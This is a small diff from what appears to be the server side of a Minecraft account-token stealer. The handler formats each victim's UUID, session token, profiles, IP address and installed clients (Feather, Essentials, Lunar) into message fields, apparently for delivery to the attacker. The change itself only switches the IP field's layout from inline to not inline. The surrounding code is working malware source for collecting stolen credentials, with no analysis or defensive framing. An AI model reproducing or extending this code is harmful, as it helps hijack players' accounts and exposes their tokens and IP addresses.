@@ -164,7 +164,7 @@ app.post("/", (req, res) => {
                                 { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                 { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                 { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
-                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
+                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: false },
                                 { name: 'Feather', value: `${checkFeather}`, inline: true },
                                 { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                 { name: 'Lunar', value: `${checkLunar}`, inline: true },
